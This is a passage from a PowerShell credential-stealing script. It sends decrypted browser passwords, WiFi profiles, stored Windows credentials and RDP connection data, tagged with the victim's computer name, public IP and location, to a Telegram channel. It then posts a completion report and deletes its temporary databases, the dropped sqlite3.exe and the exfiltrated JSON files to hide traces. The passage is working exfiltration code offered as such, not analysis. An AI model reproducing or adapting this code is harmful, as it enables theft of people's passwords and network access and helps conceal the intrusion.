        $browserCaption = "‚úÖ Decrypted Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nPasswords: $($allDecryptedPasswords.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
    }
    
    if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
        $totalFiles += 1
        $networkCaption = "üåê Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nRDP Connections: $($rdpConnections.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        if (Send-TelegramFile -FilePath $NetworkJSONPath -Caption $networkCaption) { $filesSent++ }
    }
    
    # Send completion message
    $completionMessage = @"
‚úÖ <b>Extraction and Decryption Completed Successfully!</b>

üñ•Ô∏è <b>System:</b> $($systemInfo.ComputerName)
üåç <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
üîì <b>Decrypted Passwords:</b> $($allDecryptedPasswords.Count)
üì∂ <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
üîê <b>Windows Credentials:</b> $($networkCredentials.Count)
üñ•Ô∏è <b>RDP Connections:</b> $($rdpConnections.Count)
üìÅ <b>Files Sent:</b> $filesSent/$totalFiles
‚è∞ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@
    
    Send-TelegramMessage -Message $completionMessage | Out-Null
    
    if ($filesSent -eq $totalFiles) {
        Write-Host "‚úÖ All files sent to Telegram successfully!" -ForegroundColor Green
    } else {
        Write-Host "‚ùå Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
    }
    
} else {
    Write-Host "No data found in any browser or network credentials." -ForegroundColor Yellow
    $emptyMessage = "‚ùå No passwords found in any browser or network credentials.`nSystem: $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-TelegramMessage -Message $emptyMessage | Out-Null
}

Write-Host "`nEnhanced password extraction and decryption completed." -ForegroundColor Green

# Cleanup all files
Write-Host "Cleaning up all files..." -ForegroundColor Yellow

# Cleanup temporary files
Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force

# Cleanup SQLite
if (Test-Path ".\sqlite3.exe") {
    Remove-Item ".\sqlite3.exe" -Force -ErrorAction SilentlyContinue
}

# Cleanup JSON files after sending to Telegram
if (Test-Path $BrowserJSONPath) {
    Remove-Item $BrowserJSONPath -Force -ErrorAction SilentlyContinue
}

if (Test-Path $NetworkJSONPath) {
    Remove-Item $NetworkJSONPath -Force -ErrorAction SilentlyContinue
}

Write-Host "All files cleaned up." -ForegroundColor Green
